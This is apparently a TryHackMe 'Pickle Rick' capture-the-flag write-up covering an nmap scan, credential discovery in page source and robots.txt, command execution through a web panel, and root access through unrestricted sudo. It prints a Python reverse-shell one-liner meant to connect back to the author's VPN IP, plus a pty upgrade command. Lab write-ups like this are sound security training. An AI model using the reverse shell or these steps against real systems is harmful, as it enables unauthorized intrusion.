# Picke Rick

### A Rick and Morty CTF. Help turn Rick back into a human!

### Pickle Rick is a Rick and Morty themed tryhackme room where we exploit a webserver to find 3 ingredients or flags.

## Questions :

1. What is the first ingredient Rick needs?
2. Whats the second ingredient Rick needs?
3. Whats the final ingredient Rick needs?

## Enumeration

### NMAP 

> nmap -sS -sC -sV -A -O -vv BOX_IP

#### output

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 19:59 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
Initiating Ping Scan at 19:59
Scanning 10.10.32.22 [4 ports]
Completed Ping Scan at 19:59, 0.79s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:59
Completed Parallel DNS resolution of 1 host. at 19:59, 0.01s elapsed
Initiating SYN Stealth Scan at 19:59
Scanning 10.10.32.22 [1000 ports]
Discovered open port 80/tcp on 10.10.32.22
Discovered open port 22/tcp on 10.10.32.22
Completed SYN Stealth Scan at 19:59, 4.94s elapsed (1000 total ports)
Initiating Service scan at 19:59
Scanning 2 services on 10.10.32.22
Completed Service scan at 19:59, 7.52s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.32.22
Retrying OS detection (try #2) against 10.10.32.22
Retrying OS detection (try #3) against 10.10.32.22
Retrying OS detection (try #4) against 10.10.32.22
Retrying OS detection (try #5) against 10.10.32.22
Initiating Traceroute at 20:00
Completed Traceroute at 20:00, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:00
Completed Parallel DNS resolution of 2 hosts. at 20:00, 0.01s elapsed
NSE: Script scanning 10.10.32.22.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 20.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 3.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 0.00s elapsed
Nmap scan report for 10.10.32.22
Host is up, received reset ttl 61 (0.75s latency).
Scanned at 2020-10-06 19:59:18 BST for 70s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08:16:72:a6:42:80:aa:21:3f:9e:2a:76:4c:bc:45:0d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDibc1nVIGXaLx8nF5hflDtQi7KVayIQjoV/97QvFHpe67phA9ozRb+o0Azrp3UBxc6zlGDJiPRPdgXZUL53Zygvip9Tj/8GYucBA1yzcN5gtWfR7cVG/vZo/ToDD2bTiVbMy1fW7zWa9Le9VEytFnsBFOk0ePEn5rI7wLuZ+HHaVTJegtq6KIVw9eQUCxTqfjEvFxCyJMSbwPXWdURGwVYOW3VVpU8awDkklUZRQ/ElsKGJLLF+CjtQ3/+aT9VeWKIP8n/k+ymFL0zvkygEGdMaUOFBiaZd8FAAiBAbHXNGg2Scsnmid8V9sXS0tyN4OuItZ7Xc26eKmlsCzDkJlJJ
|   256 38:e1:90:b4:69:a0:49:f8:1d:cb:d5:1a:79:22:a2:b1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGo31VvNkXrpUtTcaSzV68TxybntTXNKXfLV7uueau4r5ROiko7CqYXSBBbcKovi06b+fPCIxdnu84ZHNrMK41Q=
|   256 a0:48:4b:8f:87:64:67:ca:d3:d3:61:3a:b2:80:f3:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlvtA3D1u0/IPcguHsofaDoMS4J2/VyFUsc5Ko+hKtM
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/6%OT=22%CT=1%CU=34655%PV=Y%DS=4%DC=T%G=Y%TM=5F7CBEC
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 0.006 days (since Tue Oct  6 19:51:51 2020)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   491.98 ms 10.4.0.1
2   ... 3
4   752.26 ms 10.10.32.22

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:00
Completed NSE at 20:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.87 seconds
           Raw packets sent: 1131 (53.730KB) | Rcvd: 1083 (46.818KB)
```

we have two open ports, 20 (ssh) and 80 (apache2 httpd)

## Site

![image](https://user-images.githubusercontent.com/53917092/95249981-e118a900-07ef-11eb-8a7e-cbdd288c1cb3.png)

### Source Code

![image](https://user-images.githubusercontent.com/53917092/95249935-d0683300-07ef-11eb-8e78-d666c56d47fc.png)

> Username: R1ckRul3s

###  find out interesting directories and files

I used dirbuster

![image](https://user-images.githubusercontent.com/53917092/95251000-44efa180-07f1-11eb-9d38-df6acd09fb4a.png)

![image](https://user-images.githubusercontent.com/53917092/95252462-63ef3300-07f3-11eb-8681-28b0a6ea917f.png)


#### robots.txt 

![image](https://user-images.githubusercontent.com/53917092/95252646-a4e74780-07f3-11eb-8898-a829866a4218.png)

(a string like a password???)

### Login

trying to login with User:R1ckRul3s and Password:Wubbalubbadubdub in /login.php

![image](https://user-images.githubusercontent.com/53917092/95253093-466e9900-07f4-11eb-89b8-cf9c15df7677.png)

![image](https://user-images.githubusercontent.com/53917092/95253107-4cfd1080-07f4-11eb-9bca-459a05af45f4.png)

#### Success

### RCE

on this panel we were able to execute commands on the system

![image](https://user-images.githubusercontent.com/53917092/95253253-85045380-07f4-11eb-9ebd-1a4f1dededdf.png)

then let's try a reverse shell from that

for this we will use the python, so we have to know where it is (and if it exists)

![image](https://user-images.githubusercontent.com/53917092/95253426-b9780f80-07f4-11eb-9a18-c8905ac8b69d.png)

all right, let's run the reverse shell

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

(changing the ip address for my thm-vpn IP)

### Reverse Shell

![image](https://user-images.githubusercontent.com/53917092/95253810-55098000-07f5-11eb-994a-3c6b88ee9c85.png)

#### Shell to TTY

> python3 -c "import pty; pty.spawn('/bin/bash')"

![image](https://user-images.githubusercontent.com/53917092/95254413-3f488a80-07f6-11eb-9a0d-9b3ae8d00ca3.png)

### answering the first question

> cat Sup3rS3cretPickl3Ingred.txt

![image](https://user-images.githubusercontent.com/53917092/95254695-a7976c00-07f6-11eb-9be7-a3e4041c6b1d.png)

### walking to the second question

![image](https://user-images.githubusercontent.com/53917092/95254893-f8a76000-07f6-11eb-9793-c4acdad204f9.png)

### answering the first question

![image](https://user-images.githubusercontent.com/53917092/95255082-402dec00-07f7-11eb-8d45-bb296536341f.png)

### walking to the second root

looking at the commands that the user can run

> sudo -l

![image](https://user-images.githubusercontent.com/53917092/95255409-b03c7200-07f7-11eb-90f2-b852d6f149dc.png)


EASY!!!!!

We can run ANY command as root without password :O

## Root flag

![image](https://user-images.githubusercontent.com/53917092/95255573-fdb8df00-07f7-11eb-9447-99a43927e285.png)
